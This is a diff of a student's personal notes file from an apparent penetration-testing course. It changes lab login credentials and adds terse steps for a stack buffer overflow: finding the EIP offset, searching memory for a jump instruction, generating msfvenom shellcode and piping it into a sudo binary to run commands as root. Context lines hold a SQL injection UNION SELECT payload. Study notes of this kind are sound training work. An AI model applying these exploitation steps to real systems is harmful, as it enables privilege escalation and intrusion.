@@ -31,8 +31,8 @@ UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 
 # Notes
 ip 10.50.24.239
-username LOCH-003-M
-password b5jiQouilMxguhI and no
+username YOPA-003-M
+password Orionpax and no
 stack 9
 xfreerdp /v:10.50.23.50 /u:student +clipboard +dynamic-resolution +glyph-cache
 ssh student@10.50.33.11 -X
@@ -147,3 +147,24 @@ https://webbreacher.files.wordpress.com/2018/07/data-collection3.png?w=1136
 cve.mitre.orgcve.mitre.org
 CVE -  CVE
 The mission of the CVE® Program is to identify, define, and catalog publicly disclosed cybersecurity vulnerabilities.
+  
+  
+  
+  buff
+  find overflow valye
+  find eip offset 
+  env - gdb func (low quality gdb)
+  remove env vars
+  (show env ---- unset "var")
+  run func
+  overflow manually
+  info proc map
+  find /b 0xf7de1000,0xf7ffe000,0xff,0xe4
+        (^is line after heap)(^ is line before stack)
+  
+ msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+copy shell code 
+  sudo ./func <<< $(python buff.py)
+      if root 
+      change the whoami to command you want to run
+               
